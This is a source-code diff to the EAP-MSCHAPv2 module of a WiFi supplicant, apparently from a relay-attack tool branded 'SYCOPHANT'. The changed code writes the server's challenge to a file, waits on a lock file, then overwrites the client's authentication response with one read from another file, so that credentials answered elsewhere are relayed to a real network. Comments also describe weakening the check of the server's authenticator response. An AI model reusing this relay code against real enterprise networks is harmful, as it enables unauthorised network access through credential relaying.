@@ -233,10 +233,10 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 		   "(response)", id, ms->mschapv2_id);
 
 	
-	// MICHAEL WAS HERE
-	// Read response from file.
+	// SYCOPHANT 
+	// Read auth-response from file.
 
-	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : RESPONSE SET BY PEER",
+	wpa_hexdump(MSG_INFO, "SYCOPHANT : RESPONSE SET BY PEER",
 		resp->buf, resp->used);
 
 	// Waiting for response (Bull spinlock)
@@ -245,41 +245,79 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 	u8 lockvar [1];
 
 	if( inLock == NULL )
-		printf("Open Error Lock");
+		wpa_printf(MSG_INFO,"Open Error Lock");
 	
-	while(fread(lockvar,1,1,inLock) < 1 ){
+	while(fread(lockvar,1,1,inLock) < 1 )
 		usleep(10000);
-	}
+	
 	fclose(inLock);
 	inLock = fopen(inLockName, "wb");
 	fclose(inLock);
 	// Yay response
 
-	// char* inFileName = "RESPONSE_FILE.txt";
-	inFile = fopen(inFileName, "rb");	
-	u8 line [resp->used]; 
+	// int dominic = 0; 
+	// int size = 0;
 
-	if( inFile == NULL )
-		printf("Open Error File");
+	// if(dominic){
+	// 	inFile = fopen(inFileName, "rb");
 
-	fread(line, resp->used, 1, inFile);
+	// 	if( inFile == NULL ){
+	// 		wpa_printf(MSG_INFO, "Response File open error, segfault incomming");
+	// 	}
 
-	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : AUTH RESPONSE CONTENTS",
-		resp->buf, resp->used);
-	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : LINE CONTENTS",
-		line, resp->used);
+	// 	fseek(inFile, 0, SEEK_END);
+	// 	size = ftell(inFile);
+	// 	rewind(inFile);
 
-	memcpy(resp->buf, line, resp->used);
+	// 	fclose(inFile);
+	// } else {
+	// 	while (size <= 0){
+	// 		inFile = fopen(inFileName, "rb");
 
-	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : AUTH RESPONSE CONTENTS (AFTER MODIFY)",
-		resp->buf, resp->used);
+	// 		if( inFile == NULL ){
+	// 			wpa_printf(MSG_INFO, "Response File open error, segfault incomming");
+	// 		}
 
-	fclose(inFile);
+	// 		fseek(inFile, 0, SEEK_END);
+	// 		size = ftell(inFile);
+	// 		rewind(inFile);
 
-	// Clean File
-	inFile = fopen(inFileName, "wb");
-	fclose(inFile);
+	// 		wpa_printf(MSG_INFO, "Size Recieved was : %i", size );
 
+	// 		fclose(inFile);	
+
+	// 		// TODO: find replace for all these random youtube vids 
+	// 		// https://www.youtube.com/watch?v=QUNJ5TRRYqg 
+	// 		usleep(10000);
+	// 	}
+	// }
+
+	if(TRUE){
+		// char* inFileName = "RESPONSE_FILE.txt";
+		inFile = fopen(inFileName, "rb");	
+		u8 line [resp->used]; 
+
+		if( inFile == NULL )
+			wpa_printf(MSG_INFO,"Open Error File");
+
+		fread(line, resp->used, 1, inFile);
+
+		wpa_hexdump(MSG_INFO, "SYCOPHANT : AUTH RESPONSE CONTENTS",
+			resp->buf, resp->used);
+		wpa_hexdump(MSG_INFO, "SYCOPHANT : LINE CONTENTS",
+			line, resp->used);
+
+		memcpy(resp->buf, line, resp->used);
+
+		wpa_hexdump(MSG_INFO, "SYCOPHANT : AUTH RESPONSE CONTENTS (AFTER MODIFY)",
+			resp->buf, resp->used);
+
+		fclose(inFile);
+
+		// Clean File
+		inFile = fopen(inFileName, "wb");
+		fclose(inFile);
+	}
 	// MICHAEL STOPED HERE
 
 	return resp;
@@ -350,8 +388,8 @@ static struct wpabuf * eap_mschapv2_challenge(
 	ret->decision = DECISION_FAIL;
 	ret->allowNotifications = TRUE;
 
-	// MICHAEL WAS HERE
-	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : CHALLANGE DATA", challenge, MSCHAPV2_KEY_LEN);
+	// SYCOPHANT START
+	wpa_hexdump(MSG_INFO, "SYCOPHANT : CHALLANGE DATA", challenge, MSCHAPV2_KEY_LEN);
 
 	// char* outFileName = "CHALLENGE_FILE.txt";
 	outFile = fopen(outFileName, "wb");
@@ -380,7 +418,7 @@ static struct wpabuf * eap_mschapv2_challenge(
 	fclose(outLock);
 	// OK GO!
 
-	// MICHAEL STOPPED HERE
+	// SYCOPHANT END
 	
 
 	return eap_mschapv2_challenge_reply(sm, data, id, req->mschapv2_id,
@@ -448,16 +486,20 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Received success");
 	len = req_len - sizeof(*req);
 	pos = (const u8 *) (req + 1);
-	// MICHAEL WAS HERE
+	// SYCOPHANT START
 	if (mschapv2_verify_auth_response(data->auth_response, pos, len))
-		wpa_printf(MSG_INFO,"INVALID AUTHRESPONSE MYDUDE");
-	// THIS MAY BE BREAKING STUFF
+		wpa_printf(MSG_INFO,"Response not verified, does not seem important");
+	if (!data->auth_response_valid)
+		wpa_printf(MSG_INFO,"data->auth_response_valid is not valid : %i", data->auth_response_valid) ;
+	// THIS MAY BE BREAKING STUFF! 
+	// You do connect and its all good, but hmmmmmm.
+	// https://www.youtube.com/watch?v=UxxajLWwzqY 
 	// NOTTED THE mschapv2_verify_auth_response
 	if (!data->auth_response_valid ||
 	    !mschapv2_verify_auth_response(data->auth_response, pos, len)) {
 		wpa_printf(MSG_WARNING, "EAP-MSCHAPV2: Invalid authenticator "
 			   "response in success request");
-	// MICHAEL STOPPED HEE
+	// SYCOPHANT END
 		ret->methodState = METHOD_DONE;
 		ret->decision = DECISION_FAIL;
 		return NULL;
